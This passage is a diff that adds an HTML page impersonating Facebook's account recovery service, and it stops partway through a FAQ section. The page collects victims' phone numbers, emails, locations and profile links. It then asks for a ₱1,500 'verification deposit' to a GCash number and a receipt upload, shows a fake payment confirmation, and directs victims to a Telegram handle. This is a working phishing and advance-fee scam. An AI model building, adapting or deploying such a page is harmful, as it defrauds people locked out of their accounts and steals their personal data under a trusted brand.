@@ -1,0 +1,1466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Account Recovery Center | Facebook</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  :root{
+    --fb:#1877f2;--fb-dark:#166fe5;--fb-light:#e7f3ff;
+    --ink:#1c1e21;--muted:#606770;--soft:#8a8d91;
+    --line:#dadde1;--bg:#f0f2f5;--red:#e41e3f;--green:#42b72a;--amber:#f5a623;
+    --tg:#229ED9;
+    --shadow:0 2px 12px rgba(0,0,0,.12),0 1px 3px rgba(0,0,0,.08);
+  }
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:var(--bg);color:var(--ink);display:flex;flex-direction:column;min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+  }
+  a{color:var(--fb);text-decoration:none;cursor:pointer}
+  a:hover{text-decoration:underline}
+  button{font-family:inherit}
+
+  /* Header */
+  .hdr{background:#fff;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:50}
+  .hdr-in{max-width:1120px;margin:0 auto;padding:10px 20px;
+    display:flex;align-items:center;justify-content:space-between;gap:16px}
+  .brand{display:flex;align-items:center;gap:10px;min-width:0;cursor:pointer}
+  .fb-logo{width:40px;height:40px;border-radius:50%;background:var(--fb);
+    display:flex;align-items:center;justify-content:center;flex:none}
+  .fb-logo svg{width:26px;height:26px;fill:#fff}
+  .brand-word{font-size:24px;font-weight:800;color:var(--fb);
+    letter-spacing:-1px;font-family:Helvetica,Arial,sans-serif}
+  .brand-div{width:1px;height:24px;background:var(--line);margin:0 4px}
+  .brand-meta{font-size:15px;font-weight:700;color:var(--muted)}
+  .nav{display:flex;align-items:center;gap:6px;margin-left:auto;margin-right:12px}
+  .nav a{font-size:14px;font-weight:600;color:var(--muted);padding:8px 12px;
+    border-radius:8px;transition:background .12s,color .12s}
+  .nav a:hover{background:var(--bg);color:var(--ink);text-decoration:none}
+  .nav a.on{color:var(--fb);background:var(--fb-light)}
+  .hdr-right{display:flex;align-items:center;gap:14px;font-size:13px;color:var(--muted)}
+  .hdr-right a{color:var(--muted)}
+  .hdr-right a:hover{color:var(--fb);text-decoration:none}
+  .pill{display:inline-flex;align-items:center;gap:6px;background:var(--fb-light);
+    color:var(--fb);border-radius:999px;padding:6px 12px;font-size:12px;font-weight:600}
+  .pill svg{width:13px;height:13px;fill:var(--fb)}
+
+  /* Hero */
+  .hero{background:linear-gradient(180deg,#e7f3ff 0%,#f0f2f5 100%);
+    border-bottom:1px solid var(--line)}
+  .hero-in{max-width:1120px;margin:0 auto;padding:36px 20px 40px;text-align:center}
+  .hero h1{font-size:30px;font-weight:800;letter-spacing:-.6px;margin-bottom:10px}
+  .hero p{font-size:15px;color:var(--muted);max-width:560px;margin:0 auto;line-height:1.5}
+
+  /* Stepper */
+  .stepper{max-width:1120px;margin:0 auto;padding:22px 20px 0;
+    display:flex;align-items:center;justify-content:center}
+  .step{display:flex;align-items:center;gap:10px;flex:none}
+  .step-dot{width:28px;height:28px;border-radius:50%;flex:none;
+    display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;
+    background:#fff;color:var(--soft);border:2px solid var(--line)}
+  .step.done .step-dot{background:var(--fb);border-color:var(--fb);color:#fff}
+  .step.active .step-dot{border-color:var(--fb);color:var(--fb);box-shadow:0 0 0 4px var(--fb-light)}
+  .step-label{font-size:13px;font-weight:600;color:var(--soft);white-space:nowrap}
+  .step.done .step-label,.step.active .step-label{color:var(--ink)}
+  .step-line{width:56px;height:2px;background:var(--line);margin:0 12px;flex:none}
+  .step-line.done{background:var(--fb)}
+
+  /* Layout */
+  .wrap{max-width:760px;width:100%;margin:0 auto;padding:26px 20px 44px;flex:1}
+
+  /* Card */
+  .card{background:#fff;border-radius:12px;box-shadow:var(--shadow);padding:32px 34px 30px}
+  .card-head{margin-bottom:22px}
+  .card-head h2{font-size:22px;font-weight:700;letter-spacing:-.3px;margin-bottom:6px}
+  .card-head p{font-size:14px;color:var(--muted);line-height:1.5}
+
+  .field{margin-bottom:16px}
+  .field label{display:block;font-size:13px;font-weight:600;color:var(--ink);margin-bottom:7px}
+  .field label .req{color:var(--red);margin-left:2px}
+  .field .hint{font-size:12px;color:var(--soft);margin-top:6px;line-height:1.4}
+  .field input,.field select{
+    width:100%;height:50px;border:1px solid var(--line);border-radius:8px;padding:0 14px;
+    font-size:15px;color:var(--ink);background:#fff;outline:none;font-family:inherit;
+    transition:border-color .15s,box-shadow .15s;appearance:none}
+  .field select{
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23606770' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+    background-repeat:no-repeat;background-position:right 16px center;padding-right:40px;cursor:pointer}
+  .field select:invalid{color:var(--soft)}
+  .field input::placeholder{color:var(--soft)}
+  .field input:focus,.field select:focus{border-color:var(--fb);box-shadow:0 0 0 3px rgba(24,119,242,.18)}
+  .field.err input,.field.err select{border-color:var(--red)}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  .row-3{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:14px}
+
+  .btn{width:100%;height:52px;border:none;border-radius:8px;background:var(--fb);color:#fff;
+    font-size:17px;font-weight:700;cursor:pointer;margin-top:8px;
+    display:flex;align-items:center;justify-content:center;gap:10px;transition:background .15s}
+  .btn:hover{background:var(--fb-dark)}
+  .btn:disabled{opacity:.75;cursor:default}
+  .btn.green{background:var(--green)}
+  .btn.green:hover{background:#36a420}
+  .btn.ghost{background:#fff;color:var(--fb);border:1px solid var(--line)}
+  .btn.ghost:hover{background:var(--bg)}
+  .spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.4);
+    border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;display:none}
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  .card-foot{margin-top:22px;padding-top:18px;border-top:1px solid var(--line);
+    display:flex;flex-wrap:wrap;gap:8px 20px;justify-content:center;font-size:13px}
+  .card-foot a{font-weight:600}
+  .legal{font-size:12px;color:var(--soft);line-height:1.6;text-align:center;margin-top:16px}
+  .legal a{color:var(--fb)}
+
+  /* Step 2 payment */
+  .paybox{background:linear-gradient(135deg,#e7f3ff,#f7fbff);
+    border:1px solid #cfe3fb;border-radius:14px;padding:24px 20px;text-align:center;margin-bottom:20px}
+  .paybox-l{font-size:11.5px;font-weight:700;letter-spacing:.9px;
+    text-transform:uppercase;color:var(--fb);margin-bottom:12px}
+  .paybox-n{font-size:30px;font-weight:800;letter-spacing:.5px;line-height:1.15;
+    font-family:"SF Mono",Menlo,Consolas,monospace;color:var(--ink);user-select:all;word-break:break-all}
+  .paybox-m{font-size:12.5px;color:var(--muted);margin-top:10px}
+  .paybox-amt{margin-top:16px;padding-top:14px;border-top:1px dashed #cfe3fb;
+    font-size:13px;color:var(--muted)}
+  .paybox-amt b{font-size:17px;color:var(--ink);font-weight:800;display:block;margin-top:4px}
+
+  .copybar{display:flex;gap:8px}
+  .copybar button{flex:1;height:40px;border:1px solid var(--line);background:#fff;
+    border-radius:8px;font-size:13px;font-weight:700;color:var(--fb);cursor:pointer}
+  .copybar button:hover{background:var(--bg)}
+
+  .paysteps{background:#fafbfc;border:1px solid var(--line);border-radius:10px;
+    padding:16px 18px;margin-bottom:20px}
+  .paysteps h4{font-size:13px;font-weight:700;margin-bottom:12px}
+  .paystep{display:flex;gap:12px;margin-bottom:12px;font-size:13.5px;color:var(--muted);line-height:1.5}
+  .paystep:last-child{margin-bottom:0}
+  .paystep-n{width:22px;height:22px;border-radius:50%;background:var(--fb-light);
+    color:var(--fb);font-size:11px;font-weight:800;display:flex;align-items:center;
+    justify-content:center;flex:none}
+
+  .tg-note{display:flex;gap:10px;align-items:flex-start;background:#fff8e6;
+    border:1px solid #ffe2a8;border-radius:10px;padding:12px 14px;font-size:13px;
+    color:#6b4e00;line-height:1.5;margin-bottom:20px}
+  .tg-note svg{width:17px;height:17px;fill:#c99a00;flex:none;margin-top:1px}
+  .tg-note a{color:#0a66c2;font-weight:700}
+
+  /* Upload */
+  .upload{border:2px dashed var(--line);border-radius:10px;padding:26px 16px;text-align:center;
+    cursor:pointer;transition:border-color .15s,background .15s;background:#fafbfc;display:block}
+  .upload:hover{border-color:var(--fb);background:var(--fb-light)}
+  .upload.drag{border-color:var(--fb);background:var(--fb-light)}
+  .upload svg{width:34px;height:34px;fill:var(--soft);margin-bottom:8px}
+  .upload-t{font-size:14px;font-weight:600}
+  .upload-d{font-size:12px;color:var(--soft);margin-top:4px}
+  .upload.has{border-style:solid;border-color:var(--green);background:#f3fbf1}
+  .upload.has svg{fill:var(--green)}
+  .upload .file-name{font-size:13px;font-weight:600;color:#2d7d20;
+    margin-top:6px;word-break:break-all}
+  .upload input{display:none}
+  .field.fileerr .upload{border-color:var(--red);background:#fff5f6}
+
+  /* Step 4 */
+  .waiting{text-align:center;padding:30px 6px 24px}
+  .wait-ring{width:78px;height:78px;border-radius:50%;border:4px solid #e7f3ff;
+    border-top-color:var(--fb);margin:0 auto 24px;animation:spin 1s linear infinite}
+  .waiting h2{font-size:22px;font-weight:700;margin-bottom:10px}
+  .waiting p{font-size:14.5px;color:var(--muted);line-height:1.6;max-width:400px;margin:0 auto}
+  .wait-list{max-width:360px;margin:26px auto 0;text-align:left}
+  .wait-item{display:flex;align-items:center;gap:12px;padding:11px 0;
+    font-size:13.5px;color:var(--soft);border-bottom:1px solid #f0f2f5}
+  .wait-item:last-child{border-bottom:none}
+  .wait-item .dot{width:20px;height:20px;border-radius:50%;border:2px solid var(--line);
+    flex:none;display:flex;align-items:center;justify-content:center}
+  .wait-item.on{color:var(--ink);font-weight:600}
+  .wait-item.on .dot{border-color:var(--fb);background:var(--fb)}
+  .wait-item.on .dot::after{content:"";width:6px;height:6px;border-radius:50%;background:#fff}
+  .wait-item.ok{color:var(--green);font-weight:600}
+  .wait-item.ok .dot{border-color:var(--green);background:var(--green)}
+  .wait-item.ok .dot::after{content:"✓";color:#fff;font-size:11px;font-weight:800}
+
+  /* Success */
+  .success{display:none;text-align:center;padding:20px 6px 10px}
+  .success .ring{width:64px;height:64px;border-radius:50%;background:var(--green);
+    margin:0 auto 18px;display:flex;align-items:center;justify-content:center;
+    box-shadow:0 0 0 8px #e9f7e6}
+  .success .ring svg{width:30px;height:30px;stroke:#fff;stroke-width:3;fill:none}
+  .success h2{font-size:21px;font-weight:700;margin-bottom:8px}
+  .success p{font-size:14px;color:var(--muted);line-height:1.55;max-width:380px;margin:0 auto}
+
+  .tg-card{background:#e8f4fd;border:1px solid #bfe0f7;border-radius:12px;
+    padding:22px 20px;margin-top:24px;text-align:center}
+  .tg-card h3{font-size:17px;margin-bottom:8px}
+  .tg-card p{font-size:13.5px;color:#1a4b6b;line-height:1.55;margin-bottom:16px}
+  .tg-btn{display:inline-flex;align-items:center;gap:9px;background:var(--tg);color:#fff;
+    font-weight:700;font-size:15px;padding:13px 26px;border-radius:999px;text-decoration:none;
+    transition:background .15s}
+  .tg-btn:hover{background:#1b8cc0;text-decoration:none}
+  .tg-btn svg{width:19px;height:19px;fill:#fff}
+  .tg-handle{display:block;margin-top:12px;font-size:13.5px;color:#1a4b6b;font-weight:700}
+
+  /* Summary */
+  .summary{border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-bottom:20px}
+  .summary-row{display:flex;justify-content:space-between;gap:12px;padding:11px 14px;
+    font-size:13.5px;border-bottom:1px solid var(--line)}
+  .summary-row:last-child{border-bottom:none}
+  .summary-row span{color:var(--muted);flex:none}
+  .summary-row b{font-weight:600;text-align:right;word-break:break-all}
+
+  /* Help */
+  .help-hero{background:#fff;border-bottom:1px solid var(--line);padding:34px 20px}
+  .help-hero-in{max-width:760px;margin:0 auto;text-align:center}
+  .help-hero h1{font-size:26px;font-weight:800;margin-bottom:10px;letter-spacing:-.4px}
+  .search{max-width:520px;margin:18px auto 0;position:relative}
+  .search input{width:100%;height:50px;border:1px solid var(--line);border-radius:999px;
+    padding:0 20px 0 48px;font-size:15px;outline:none;font-family:inherit;background:#fff}
+  .search input:focus{border-color:var(--fb);box-shadow:0 0 0 3px rgba(24,119,242,.18)}
+  .search svg{position:absolute;left:18px;top:50%;transform:translateY(-50%);
+    width:18px;height:18px;fill:var(--soft)}
+  .topic{display:flex;gap:14px;padding:16px 4px;border-bottom:1px solid var(--line);cursor:pointer}
+  .topic:last-child{border-bottom:none}
+  .topic:hover{background:#fafbfc}
+  .topic-ico{width:40px;height:40px;border-radius:10px;background:var(--fb-light);
+    display:flex;align-items:center;justify-content:center;flex:none}
+  .topic-ico svg{width:20px;height:20px;fill:var(--fb)}
+  .topic-t{font-size:14px;font-weight:600;margin-bottom:3px}
+  .topic-d{font-size:13px;color:var(--muted);line-height:1.45}
+  .topic-arrow{margin-left:auto;color:var(--soft);font-size:20px;align-self:center}
+
+  .faq{border:1px solid var(--line);border-radius:10px;overflow:hidden;margin-top:16px}
+  .faq-q{padding:14px 16px;font-size:14px;font-weight:600;cursor:pointer;
+    display:flex;justify-content:space-between;align-items:center;background:#fff;
+    border-bottom:1px solid var(--line)}
+  .faq-q:hover{background:#fafbfc}
+  .faq-q span:last-child{color:var(--soft);font-weight:400;transition:transform .15s}
+  .faq.open .faq-q span:last-child{transform:rotate(180deg)}
+  .faq-a{display:none;padding:0 16px 16px;font-size:13.5px;color:var(--muted);line-height:1.6}
+  .faq.open .faq-a{display:block}
+
+  /* Overlay / Modal / Toast */
+  .overlay{position:fixed;inset:0;background:rgba(255,255,255,.96);z-index:200;
+    display:none;align-items:center;justify-content:center;flex-direction:column;gap:20px;padding:24px}
+  .overlay.on{display:flex}
+  .overlay .big-spin{width:44px;height:44px;border:3px solid #e7f3ff;border-top-color:var(--fb);
+    border-radius:50%;animation:spin .8s linear infinite}
+  .overlay p{font-size:15px;color:var(--muted);font-weight:600}
+
+  .modal{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:300;
+    display:none;align-items:center;justify-content:center;padding:20px}
+  .modal.on{display:flex}
+  .modal-box{background:#fff;border-radius:12px;max-width:640px;width:100%;
+    max-height:82vh;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+  .modal-hd{padding:18px 22px;border-bottom:1px solid var(--line);
+    display:flex;align-items:center;justify-content:space-between}
+  .modal-hd h3{font-size:17px;font-weight:700}
+  .modal-x{width:32px;height:32px;border:none;background:var(--bg);border-radius:50%;
+    font-size:18px;color:var(--muted);cursor:pointer;line-height:1}
+  .modal-x:hover{background:var(--line)}
+  .modal-bd{padding:22px;overflow-y:auto;font-size:14px;color:#3a3b3c;line-height:1.65}
+  .modal-bd h4{font-size:14px;font-weight:700;margin:16px 0 6px;color:var(--ink)}
+  .modal-bd h4:first-child{margin-top:0}
+  .modal-bd p{margin-bottom:12px}
+  .modal-bd ul{margin:0 0 12px 20px}
+  .modal-bd li{margin-bottom:6px}
+  .modal-ft{padding:14px 22px;border-top:1px solid var(--line);text-align:right}
+  .modal-ft button{height:40px;padding:0 22px;border:none;border-radius:8px;
+    background:var(--fb);color:#fff;font-weight:700;font-size:14px;cursor:pointer}
+  .modal-ft button:hover{background:var(--fb-dark)}
+
+  .toast{position:fixed;bottom:24px;left:50%;transform:translate(-50%,120%);
+    background:#1c1e21;color:#fff;padding:12px 20px;border-radius:8px;font-size:13.5px;
+    font-weight:600;z-index:400;transition:transform .25s;box-shadow:0 6px 24px rgba(0,0,0,.3);
+    max-width:90vw;text-align:center}
+  .toast.on{transform:translate(-50%,0)}
+
+  /* Footer */
+  .ftr{border-top:1px solid var(--line);background:#fff;padding:22px 20px;
+    font-size:12.5px;color:var(--soft)}
+  .ftr-in{max-width:1120px;margin:0 auto}
+  .ftr-links{display:flex;flex-wrap:wrap;gap:8px 18px;margin-bottom:12px}
+  .ftr-links a{color:var(--muted)}
+  .ftr-meta{display:flex;flex-wrap:wrap;justify-content:space-between;gap:8px}
+
+  .view{display:none}
+  .view.on{display:block}
+  #stepper.hide{display:none}
+
+  @media(max-width:900px){
+    .nav{display:none}
+  }
+  @media(max-width:560px){
+    .hdr-in{padding:8px 14px}
+    .brand-word{font-size:20px}
+    .brand-meta,.brand-div,.hdr-right .pill{display:none}
+    .hero-in{padding:28px 16px 32px}
+    .hero h1{font-size:23px}
+    .wrap{padding:18px 14px 32px}
+    .card{padding:24px 18px 22px;border-radius:10px}
+    .card-head h2{font-size:19px}
+    .row,.row-3{grid-template-columns:1fr}
+    .step-label{font-size:11px}
+    .stepper{padding:18px 8px 0}
+    .step-line{width:16px;margin:0 4px}
+    .paybox-n{font-size:26px}
+  }
+</style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="hdr">
+  <div class="hdr-in">
+    <div class="brand" data-nav="1">
+      <div class="fb-logo" aria-hidden="true">
+        <svg viewBox="0 0 32 32"><path d="M21.4 6.2h-2.6c-2.9 0-4.8 1.9-4.8 4.9v2.2h-2.4v3.4h2.4V27h3.6v-10.3h2.9l.4-3.4h-3.3v-1.9c0-1 .3-1.5 1.5-1.5h1.9V6.2z"/></svg>
+      </div>
+      <span class="brand-word">facebook</span>
+      <span class="brand-div"></span>
+      <span class="brand-meta">Recovery Center</span>
+    </div>
+
+    <nav class="nav">
+      <a data-nav="1" data-tab="recover">Recovery</a>
+      <a data-nav="help" data-tab="help">Help</a>
+      <a data-nav="create" data-tab="create">Create account</a>
+    </nav>
+
+    <div class="hdr-right">
+      <span class="pill">
+        <svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 15-4-4 1.4-1.4L11 13.2l4.6-4.6L17 10l-6 6z"/></svg>
+        Secure connection
+      </span>
+      <a data-modal="lang" id="langLabel">English (US)</a>
+      <a data-nav="help">Help</a>
+    </div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="heroBlock">
+  <div class="hero-in">
+    <h1 id="heroTitle">Account Recovery Center</h1>
+    <p id="heroSub">Find your account and regain access. We'll verify your details and guide you through securing it.</p>
+  </div>
+</section>
+
+<!-- Stepper -->
+<div class="stepper" id="stepper">
+  <div class="step active" data-s="1"><span class="step-dot">1</span><span class="step-label">Details</span></div>
+  <span class="step-line" data-l="1"></span>
+  <div class="step" data-s="2"><span class="step-dot">2</span><span class="step-label">Payment</span></div>
+  <span class="step-line" data-l="2"></span>
+  <div class="step" data-s="3"><span class="step-dot">3</span><span class="step-label">Receipt</span></div>
+  <span class="step-line" data-l="3"></span>
+  <div class="step" data-s="4"><span class="step-dot">4</span><span class="step-label">Confirm</span></div>
+</div>
+
+<main class="wrap">
+
+  <!-- ══════════ STEP 1 ══════════ -->
+  <div class="view on" id="view-1">
+    <section class="card">
+      <form id="form1" autocomplete="off" novalidate>
+        <div class="card-head">
+          <h2>Find your account</h2>
+          <p>Enter the details linked to your account so we can locate it and start recovery.</p>
+        </div>
+
+        <div class="field">
+          <label for="f_number">Phone number <span class="req">*</span></label>
+          <input id="f_number" type="tel" inputmode="tel" placeholder="+1 555 000 0000" required>
+        </div>
+
+        <div class="field">
+          <label for="f_gmail">Email address <span class="req">*</span></label>
+          <input id="f_gmail" type="email" inputmode="email" placeholder="you@gmail.com" required>
+        </div>
+
+        <div class="field">
+          <label for="f_location">Location <span class="req">*</span></label>
+          <input id="f_location" type="text" placeholder="City, Country" required>
+          <div class="hint">The city or region you usually log in from.</div>
+        </div>
+
+        <div class="field">
+          <label for="f_status">Account status <span class="req">*</span></label>
+          <select id="f_status" required>
+            <option value="" disabled selected>Select current status</option>
+            <option>Active</option>
+            <option>Disabled</option>
+            <option>Locked</option>
+            <option>Under review</option>
+            <option>Memorialized</option>
+          </select>
+        </div>
+
+        <div class="field">
+          <label for="f_link">Account link <span class="req">*</span></label>
+          <input id="f_link" type="text" inputmode="url"
+                 placeholder="https://facebook.com/your.profile" required>
+          <div class="hint">Paste the full URL of the profile you're recovering.</div>
+        </div>
+
+        <button class="btn" id="btn1" type="submit">
+          <span class="spinner"></span><span>Continue</span>
+        </button>
+
+        <div class="card-foot">
+          <a data-nav="help">Forgot password?</a>
+          <a data-nav="create">Create new account</a>
+          <a data-modal="deposit-help">Need more help?</a>
+        </div>
+      </form>
+    </section>
+  </div>
+
+  <!-- ══════════ STEP 2 ══════════ -->
+  <div class="view" id="view-2">
+    <section class="card">
+      <div class="card-head">
+        <h2>Send your verification deposit</h2>
+        <p>Account located. Send the deposit to the number below, then tap Confirm.</p>
+      </div>
+
+      <div class="paybox">
+        <div class="paybox-l">Send to this number</div>
+        <div class="paybox-n" id="payNumber">09756070032</div>
+        <div class="paybox-m">GCash · Maya · Bank transfer</div>
+        <div class="paybox-amt">Verification deposit <b>₱1,500.00</b></div>
+      </div>
+
+      <div class="copybar">
+        <button type="button" id="copyNum">Copy number</button>
+        <button type="button" id="copyAmt">Copy amount</button>
+      </div>
+
+      <div class="paysteps" style="margin-top:20px">
+        <h4>How to send</h4>
+        <div class="paystep"><span class="paystep-n">1</span><span>Open your GCash, Maya or bank app and send <b>₱1,500.00</b> to the number above.</span></div>
+        <div class="paystep"><span class="paystep-n">2</span><span>Save the receipt or screenshot the confirmation with the reference number.</span></div>
+        <div class="paystep"><span class="paystep-n">3</span><span>Tap <b>Confirm</b> below and upload the receipt on the next step.</span></div>
+      </div>
+
+      <div class="tg-note">
+        <svg viewBox="0 0 24 24"><path d="M12 2 1 21h22L12 2zm0 5 6.5 11h-13L12 7z"/></svg>
+        <div>Need the receiving name or help sending? Message <a href="https://t.me/findmemomy" target="_blank" rel="noopener">@findmemomy</a> on Telegram before you confirm.</div>
+      </div>
+
+      <button class="btn green" id="btn2" type="button">
+        <span class="spinner"></span><span>Confirm payment sent</span>
+      </button>
+    </section>
+  </div>
+
+  <!-- ══════════ STEP 3 ══════════ -->
+  <div class="view" id="view-3">
+    <section class="card">
+      <form id="form3" autocomplete="off" novalidate>
+        <div class="card-head">
+          <h2>Upload your transaction receipt</h2>
+          <p>Attach the PDF or screenshot from your payment. This is the last thing we need.</p>
+        </div>
+
+        <div class="summary">
+          <div class="summary-row"><span>Account</span><b id="s_account">—</b></div>
+          <div class="summary-row"><span>Email</span><b id="s_email">—</b></div>
+          <div class="summary-row"><span>Sent to</span><b>09756070032</b></div>
+          <div class="summary-row"><span>Amount</span><b>₱1,500.00</b></div>
+        </div>
+
+        <div class="field" id="fileField">
+          <label>Transaction receipt (PDF) <span class="req">*</span></label>
+          <label class="upload" id="upload" for="f_file">
+            <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zM8 13h8v2H8v-2zm0 4h8v2H8v-2zm0-8h3v2H8V9z"/></svg>
+            <div class="upload-t">Upload your receipt</div>
+            <div class="upload-d">PDF, JPG or PNG — max 8 MB</div>
+            <div class="file-name" id="fileName"></div>
+            <input id="f_file" type="file" accept=".pdf,application/pdf,image/png,image/jpeg">
+          </label>
+          <div class="hint">A PDF export or screenshot of the confirmation screen works.</div>
+        </div>
+
+        <div class="field">
+          <label for="f_ref">Reference / transaction ID <span class="req">*</span></label>
+          <input id="f_ref" type="text" placeholder="e.g. 0123456789012" required>
+        </div>
+
+        <button class="btn green" id="btn3" type="submit">
+          <span class="spinner"></span><span>Confirm</span>
+        </button>
+      </form>
+    </section>
+  </div>
+
+  <!-- ══════════ STEP 4 ══════════ -->
+  <div class="view" id="view-4">
+    <section class="card">
+      <div class="waiting" id="waitingBlock">
+        <div class="wait-ring"></div>
+        <h2>Confirming, please wait</h2>
+        <p>We're verifying your payment and receipt. This usually takes a few moments — don't close this page.</p>
+        <div class="wait-list">
+          <div class="wait-item on" id="w1"><span class="dot"></span><span>Receipt received</span></div>
+          <div class="wait-item" id="w2"><span class="dot"></span><span>Verifying transaction</span></div>
+          <div class="wait-item" id="w3"><span class="dot"></span><span>Restoring account access</span></div>
+          <div class="wait-item" id="w4"><span class="dot"></span><span>Finalizing</span></div>
+        </div>
+      </div>
+
+      <div class="success" id="successBlock">
+        <div class="ring"><svg viewBox="0 0 24 24"><path d="M4 12.5 9 17.5 20 6.5"/></svg></div>
+        <h2>Payment confirmed</h2>
+        <p>Your receipt is verified and your recovery is being finalized. One last step on Telegram.</p>
+        <div class="tg-card">
+          <h3>Finish on Telegram</h3>
+          <p>Message <strong>@findmemomy</strong> to confirm your payment and get your account restored. A specialist will handle the rest.</p>
+          <a class="tg-btn" href="https://t.me/findmemomy" target="_blank" rel="noopener">
+            <svg viewBox="0 0 24 24"><path d="M9.8 15.2 9.5 19c.4 0 .7-.2 1-.5l2.4-2.3 5 3.7c.9.5 1.6.2 1.8-.9l3.3-15.4c.3-1.3-.5-1.8-1.4-1.5L2.2 9.6c-1.3.5-1.3 1.2-.2 1.5l5.1 1.6L18.9 5c.5-.4 1-.2.6.2l-9.7 9z"/></svg>
+            Open Telegram
+          </a>
+          <span class="tg-handle">@findmemomy</span>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <!-- ══════════ HELP ══════════ -->
+  <div class="view" id="view-help">
+    <section class="card" style="margin-bottom:26px">
+      <div class="card-head">
+        <h2>Help Center</h2>
+        <p>Find answers about recovering and securing your account.</p>
+      </div>
+
+      <div class="search" style="margin-bottom:20px">
+        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.8l-.3-.3a6.5 6.5 0 1 0-.7.7l.3.3v.8l5 5 1.5-1.5-5-5zm-6 0A4.5 4.5 0 1 1 14 9.5 4.5 4.5 0 0 1 9.5 14z"/></svg>
+        <input id="helpSearch" type="search" placeholder="Search help topics">
+      </div>
+
+      <div id="topicList">
+        <div class="topic" data-modal="recover-help">
+          <div class="topic-ico"><svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm1 15h-2v-2h2v2zm.8-6.3-.9.9c-.7.7-1 1.2-1 2.4h-2v-.5c0-.9.4-1.7 1-2.3l1.2-1.2c.4-.3.6-.8.6-1.3a2 2 0 1 0-4 0H6a4 4 0 1 1 8 0c0 .7-.3 1.4-.8 2z"/></svg></div>
+          <div><div class="topic-t">I can't log in to my account</div><div class="topic-d">Recover access when your password or code isn't working.</div></div>
+          <span class="topic-arrow">›</span>
+        </div>
+        <div class="topic" data-modal="locked-help">
+          <div class="topic-ico"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zM9 6a3 3 0 0 1 6 0v2H9V6z"/></svg></div>
+          <div><div class="topic-t">My account is locked</div><div class="topic-d">What to do if your account was disabled or restricted.</div></div>
+          <span class="topic-arrow">›</span>
+        </div>
+        <div class="topic" data-modal="hacked-help">
+          <div class="topic-ico"><svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.5 3.8 10.7 9 12 5.2-1.3 9-6.5 9-12V5l-9-4zm-1 15-4-4 1.4-1.4L11 13.2l4.6-4.6L17 10l-6 6z"/></svg></div>
+          <div><div class="topic-t">I think my account was hacked</div><div class="topic-d">Secure your account and review recent activity.</div></div>
+          <span class="topic-arrow">›</span>
+        </div>
+        <div class="topic" data-modal="code-help">
+          <div class="topic-ico"><svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/></svg></div>
+          <div><div class="topic-t">I didn't get my confirmation code</div><div class="topic-d">Troubleshoot codes sent by SMS or email.</div></div>
+          <span class="topic-arrow">›</span>
+        </div>
+        <div class="topic" data-modal="deposit-help">
+          <div class="topic-ico"><svg viewBox="0 0 24 24"><path d="M21 4H3a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h18a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 4-9 6-9-6V6l9 6 9-6v2z"/></svg></div>
+          <div><div class="topic-t">About the verification deposit</div><div class="topic-d">How payment, receipts and refunds work.</div></div>
+          <span class="topic-arrow">›</span>
+        </div>
+        <div class="topic" data-modal="contact">
+          <div class="topic-ico"><svg viewBox="0 0 24 24"><path d="M20 2H4a2 2 0 0 0-2 2v18l4-4h14a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2z"/></svg></div>
+          <div><div class="topic-t">Contact support</div><div class="topic-d">Reach a support specialist about your account.</div></div>
+          <span class="topic-arrow">›</span>
+        </div>
+      </div>
+
+      <div class="card-foot">
+        <a data-nav="1">Back to recovery</a>
+        <a data-nav="create">Create new account</a>
+        <a data-modal="contact">Contact support</a>
+      </div>
+    </section>
+
+    <section class="card">
+      <div class="card-head"><h2>Common questions</h2></div>
+      <div class="faq">
+        <div class="faq-q"><span>How long does account recovery take?</span><span>⌄</span></div>
+        <div class="faq-a">Most recoveries are reviewed within 24–48 hours. If we need more information, we'll contact you at the email address on file.</div>
+      </div>
+      <div class="faq">
+        <div class="faq-q"><span>What if I no longer have access to my email?</span><span>⌄</span></div>
+        <div class="faq-a">Use the recovery form with an alternate phone number or email. Our team will verify your identity using additional details from your account history.</div>
+      </div>
+      <div class="faq">
+        <div class="faq-q"><span>Why was my account disabled?</span><span>⌄</span></div>
+        <div class="faq-a">Accounts may be disabled for security reasons or for violating our Community Standards. You can request a review from the recovery form.</div>
+      </div>
+      <div class="faq">
